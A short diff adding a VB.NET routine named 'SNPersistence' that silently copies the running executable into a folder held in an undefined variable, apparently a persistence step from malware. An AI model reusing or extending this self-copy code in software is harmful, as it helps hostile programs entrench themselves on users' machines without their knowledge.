@@ -1,0 +1,9 @@
+ Shared Sub SNPersistence()
+        Dim S As String = "\" & IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
+            Try
+                If Not IO.File.Exists(SRP & S) Then
+                    IO.File.Copy(System.Windows.Forms.Application.ExecutablePath, SRP & S)
+                End If
+            Catch
+            End Try
+    End Sub
